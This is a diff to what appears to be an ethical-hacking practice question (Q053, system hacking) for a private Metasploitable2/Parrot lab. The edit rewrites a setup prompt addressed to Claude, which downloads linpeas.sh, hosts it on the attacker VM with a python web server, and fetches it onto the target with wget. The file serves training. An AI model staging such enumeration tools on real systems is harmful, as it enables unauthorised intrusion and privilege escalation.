@@ -5,7 +5,7 @@
 | **Target** | `192.168.52.129` / `192.168.52.130` |
 | **Domain** | 05 — System Hacking |
 | **Difficulty** | 🟡 Medium |
-| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
+| **Tools** | `linpeas, python3` |
 | **Time budget** | 15–25 min |
 
 ---
@@ -66,9 +66,11 @@ Kernel 2.6.24-16-server reported.
 ## 🤖 Claude Setup Prompt (for Claude-on-your-PC)
 
 ```
-1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
-2. Required services for this Q already up by default on the relevant target.
-3. If something is down, restart it on the target VM.
+Pre-requisites for Q053:
+1. Verify Metasploitable2 (192.168.52.129) up; ssh as msfadmin available.
+2. Download linpeas.sh onto Parrot: curl -sLO https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh; chmod +x linpeas.sh (place in cwd for python http.server).
+3. Start Parrot webserver in that dir: python3 -m http.server 8000 (background).
+4. From msfadmin shell on target: wget http://192.168.52.128:8000/linpeas.sh will work.
 
-Report back: "Lab ready for Q053".
+Report back: "Lab ready for Q053 — linpeas.sh hosted on Parrot:8000, ssh to 192.168.52.129 works".
 ```
